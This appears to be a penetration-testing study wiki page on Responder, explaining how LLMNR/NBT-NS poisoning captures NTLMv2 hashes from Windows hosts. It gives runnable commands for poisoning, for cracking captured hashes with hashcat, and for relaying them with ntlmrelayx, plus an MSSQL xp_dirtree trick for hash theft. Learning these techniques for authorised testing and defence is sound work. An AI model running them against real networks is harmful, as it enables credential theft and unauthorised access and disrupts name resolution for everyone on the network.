---
tags: [tool, attack/network, enumeration/smb]
module: attacking_common_services
last_updated: 2026-05-11
source_count: 1
---

# Responder

LLMNR/NBT-NS/mDNS poisoner that captures NTLMv2 hashes from Windows hosts that fail DNS resolution.

## Overview

When a Windows host attempts to resolve a name that DNS cannot answer, it falls back to LLMNR (UDP/5355) and NBT-NS (UDP/137) broadcast queries. Responder answers these broadcasts, impersonating the requested resource, and captures the NTLMv2 authentication challenge-response hashes.

## Installation

Pre-installed on Kali/Parrot. Clone from source:

```bash
git clone https://github.com/lgandx/Responder
```

## Basic usage

```bash
sudo responder -I tun0
```

Listen on `tun0` (use your active interface — `eth0` for LAN, `tun0` for VPN).

## Common flags

| Flag | Description |
|------|-------------|
| `-I <iface>` | Network interface to listen on |
| `--lm` | Disable NTLM downgrade protection (enables LM hash capture) |
| `-w` | Enable WPAD rogue proxy server |
| `-f` | Fingerprint hosts before poisoning |
| `--no-http-server` | Disable HTTP responder (use when running ntlmrelayx) |
| `--no-smb-server` | Disable SMB responder |

## Captured hash format

```
[SMB] NTLMv2-SSP Hash:
user::DOMAIN:challenge:HMAC-MD5_response:blob
```

Crack with Hashcat mode 5600:

```bash
hashcat -a 0 -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
```

## Use with NTLM relay

When relaying (not cracking), disable Responder's SMB/HTTP servers so the relay tool handles authentication:

```bash
sudo responder -I tun0 --no-http-server
# In another terminal:
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 10.129.14.130
```

## Use cases

| Scenario | Method |
|----------|--------|
| LAN position, want creds | Capture NTLMv2, crack with hashcat |
| LAN position, want access | Relay NTLMv2 to host where victim has admin |
| MSSQL hash theft | `xp_dirtree` triggers SMB auth to Responder |

## Gotchas & notes

- Requires Layer-2 broadcast visibility — works on LAN/VPN but not through routers
- Poisons the entire broadcast domain; can disrupt legitimate name resolution
- Hashes captured are NTLMv2 (hashcat mode 5600), not NTLM (mode 1000)
- SMB signing enforced on DCs prevents relay — but capture+crack still works

## Related pages

- [[attack/smb]]
- [[attack/sql_databases]] — xp_dirtree triggers hash capture
- [[tools/impacket]] — ntlmrelayx for relay attacks
- [[tools/netexec]]

## Sources

- raw/attacking_common_services/smb_attacking_smb.md
